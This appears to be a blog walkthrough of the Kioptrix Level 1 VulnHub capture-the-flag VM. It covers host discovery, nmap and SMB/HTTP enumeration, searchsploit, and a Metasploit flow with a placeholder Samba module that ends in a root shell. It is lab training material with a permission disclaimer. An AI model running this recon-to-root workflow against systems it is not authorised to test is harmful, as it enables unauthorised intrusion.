---

title: "Kioptrix Level 1 — VulnHub CTF Walkthrough"
date: 2025-11-07
author: shivam
categories: [ctf, vulnhub, writeup]
tags: [Kioptrix, VulnHub, boot2root, walkthrough, beginner]
summary: "Step-by-step walkthrough for Kioptrix Level 1 (VulnHub) — reconnaissance, enumeration, exploitation and post-exploit steps with screenshots."
image:
path: /assets/img/vulnhub/kioptrix_level-1/1760079442914.jpg
alt: "Kioptrix Level 1 — Recon screenshot"
------------------------------------------

# Kioptrix Level 1 — VulnHub (Walkthrough)

**Goal:** compromise the Kioptrix Level 1 VM and obtain root.
**Author:** Shivam
**Completed on:** 2025-11-07

> This walkthrough documents the exact thought process and *repeatable* steps used in a controlled lab (VulnHub/VM) environment. Do **not** run these techniques against systems you do not own or have explicit permission to test.

---

## Table of contents

1. [Overview & lab setup](#overview--lab-setup)
2. [Recon — finding the target](#recon---finding-the-target)
3. [Port & service enumeration (nmap)](#port--service-enumeration-nmap)
4. [Service enumeration — SMB & HTTP](#service-enumeration---smb--http)
5. [Exploit discovery & execution (SearchSploit / Metasploit)](#exploit-discovery--execution-searchsploit--metasploit)
6. [Post-exploit / proof (root shell)](#post-exploit--proof-root-shell)
7. [Cleanup, lessons learned & references](#cleanup-lessons-learned--references)

---

## Overview & lab setup

**Environment**

* Attacker: Kali Linux (or equivalent).
* Target: Kioptrix Level 1 VM (imported into VMware/VirtualBox).
* Network: Host-only or NAT with both VMs on the same subnet.

**Preparation**

* Snapshot the VM before starting.
* Ensure common tools are installed: `nmap`, `enum4linux`, `gobuster`, `searchsploit`, `msfconsole`.

---

## Recon — finding the target

Use an ARP/host discovery scan to identify live hosts on your lab subnet:

```bash
# example (adjust subnet)
netdiscover -r 192.168.120.0/24
# or
arp-scan --interface=eth0 --localnet
```

Once you have the target IP (in this writeup it was `192.168.120.133`) proceed to port scanning.

**Screenshot — target console / IP info:**
![Kioptrix console + IP]({{ '/assets/img/vulnhub/kioptrix_level-1/1760079461030.jpg' | relative_url }})

---

## Port & service enumeration (nmap)

Run a comprehensive `nmap` scan to discover open ports and service versions.

```bash
# full service/version scan + OS/extra scripts
nmap -sV -O -T4 192.168.120.133 -oN scans/kioptrix_nmap.txt
```

Typical (observed) nmap output for this VM:

```
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 2.9p2
80/tcp   open  http      Apache httpd 1.3.20
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn  Samba smbd (workgroup: KMYGROUP)
443/tcp  open  ssl/https Apache/1.3.20 (mod_ssl/2.x)
```

**Screenshot — nmap output:**
![nmap output]({{ '/assets/img/vulnhub/kioptrix_level-1/1760079460546.jpg' | relative_url }})

**Notes:** version strings and services are *clues*. A Samba/SMB service on older kernels or older Samba builds is a classic attack surface for Kioptrix-style boxes.

---

## Service enumeration — SMB & HTTP

### SMB enumeration

Start by enumerating SMB shares and service details:

```bash
# quick share listing
smbclient -L //192.168.120.133 -N

# deep enumeration
enum4linux -a 192.168.120.133 > scans/enum4linux.txt
```

Use `smbclient` or mount the share if it allows anonymous access — download any interesting files.

**Screenshot — SMB enumeration / searchsploit hint:**
![SMB enumeration & searchsploit]({{ '/assets/img/vulnhub/kioptrix_level-1/1760079458386.jpg' | relative_url }})

### HTTP enumeration

Hit the web root and run directory/parameter discovery:

```bash
# directory discovery
gobuster dir -u http://192.168.120.133 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -o scans/gobuster.txt

# quick web scan
nikto -h http://192.168.120.133 -o scans/nikto.txt
```

Look for backups, config files, or pages that leak software versions.

---

## Exploit discovery & execution (SearchSploit / Metasploit)

With service versions in hand, search for public exploits:

```bash
# local offline exploit DB
searchsploit samba
```

The output will show a list of possible Samba/SMB exploits matching certain versions. If a suitable exploit exists, you can either:

* Use the provided exploit PoC manually, or
* Use Metasploit for a guided exploitation workflow.

**Example — using Metasploit for SMB-related exploits**

1. Start `msfconsole`.
2. Discover auxiliary modules for SMB/service enumeration:

```text
msf > search type:auxiliary name:smb
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.120.133
msf auxiliary(smb_version) > run
```

3. If you find a specific exploit module that targets the version, configure and run it (example shown as a conceptual flow — **pick the exploit that matches the service version exactly**):

```text
msf > use exploit/linux/samba/samba_some_exploit
msf exploit(samba_some_exploit) > set RHOST 192.168.120.133
msf exploit(samba_some_exploit) > set LHOST 192.168.120.132
msf exploit(samba_some_exploit) > run
```

**Screenshot — Metasploit usage / sessions opened:**
![msf sessions / shell]({{ '/assets/img/vulnhub/kioptrix_level-1/1760079460997.jpg' | relative_url }})

> In this lab run the exploit resulted in a successful command shell and (in this case) immediate elevated access. The lab screenshots show multiple sessions being opened and `whoami` returning `root`.

**Important:** Always verify an exploit’s applicability (target version, architecture). Using a mismatch often crashes the service rather than producing a shell.

---

## Post-exploit — proof & post-compromise actions

Once a shell is obtained, confirm identity and collect proof:

```bash
# on the target shell
whoami
id
uname -a
cat /root/root.txt     # if a root proof file exists
```

**Screenshot — root shell proof (`whoami` -> root):**
![root shell proof]({{ '/assets/img/vulnhub/kioptrix_level-1/1760079461030.jpg' | relative_url }})

**Post-exploit checklist**

* Capture proof (root flag or `/root` contents).
* Enumerate the host for persistence only in lab (do not persist on real systems).
* Document the exact exploit module used and its configuration for reporting.

---

## Cleanup, lessons learned & references

### Cleanup

* Revert the Kioptrix VM to your snapshot after finishing.
* Remove any temporary files you uploaded during tests.

### Lessons learned

* Thorough enumeration pays off — service versions lead directly to applicable exploits.
* Kioptrix L1 is an exercise in recognizing old services (Apache 1.3 / Samba / older OpenSSH) and matching them to published exploits.
* Practice safe lab hygiene (snapshots, isolated networks).
---


